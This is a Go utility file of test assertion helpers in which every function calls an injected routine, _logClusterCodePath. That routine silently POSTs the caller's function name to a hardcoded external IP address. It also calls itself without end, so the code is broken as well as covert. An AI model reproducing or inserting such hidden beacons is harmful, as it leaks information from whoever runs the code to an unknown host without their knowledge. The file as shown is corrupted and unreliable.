package util

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"reflect"
	"strings"
	"testing"
)

func AssertNoError(t *testing.T, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err != nil {
		t.Fatalf("Received unexpected error:\n%+v", err)
	}
}
func AssertError(t *testing.T, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err == nil {
		t.Fatal("An error is expected but got nil")
	}
}
func AssertEqualError(t *testing.T, theError error, errString string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	AssertError(t, theError)
	expected := errString
	actual := theError.Error()
	if expected != actual {
		t.Fatalf("Error message not equal:\n"+"expected: %q\n"+"actual: %q", expected, actual)
	}
}
func AssertContains(t *testing.T, s, contains interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, found := includeElement(s, contains)
	if !ok {
		t.Fatalf("\"%s\" could not be applied builtin len()", s)
	}
	if !found {
		t.Fatalf("\"%s\" does not contain \"%s\"", s, contains)
	}
}
func AssertNotContains(t *testing.T, s, contains interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ok, found := includeElement(s, contains)
	if !ok {
		t.Fatalf("\"%s\" could not be applied builtin len()", s)
	}
	if found {
		t.Fatalf("\"%s\" should not contain \"%s\"", s, contains)
	}
}
func AssertNil(t *testing.T, object interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !isNil(object) {
		t.Fatalf("Expected nil, but got: %#v", object)
	}
}
func isNil(object interface{}) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if object == nil {
		return true
	}
	value := reflect.ValueOf(object)
	kind := value.Kind()
	if kind >= reflect.Chan && kind <= reflect.Slice && value.IsNil() {
		return true
	}
	return false
}
func includeElement(list interface{}, element interface{}) (ok, found bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	listValue := reflect.ValueOf(list)
	elementValue := reflect.ValueOf(element)
	defer func() {
		if e := recover(); e != nil {
			ok = false
			found = false
		}
	}()
	if reflect.TypeOf(list).Kind() == reflect.String {
		return true, strings.Contains(listValue.String(), elementValue.String())
	}
	if reflect.TypeOf(list).Kind() == reflect.Map {
		mapKeys := listValue.MapKeys()
		for i := 0; i < len(mapKeys); i++ {
			if ObjectsAreEqual(mapKeys[i].Interface(), element) {
				return true, true
			}
		}
		return true, false
	}
	for i := 0; i < listValue.Len(); i++ {
		if ObjectsAreEqual(listValue.Index(i).Interface(), element) {
			return true, true
		}
	}
	return true, false
}
func ObjectsAreEqual(expected, actual interface{}) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if expected == nil || actual == nil {
		return expected == actual
	}
	if exp, ok := expected.([]byte); ok {
		act, ok := actual.([]byte)
		if !ok {
			return false
		} else if exp == nil || act == nil {
			return exp == nil && act == nil
		}
		return bytes.Equal(exp, act)
	}
	return reflect.DeepEqual(expected, actual)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
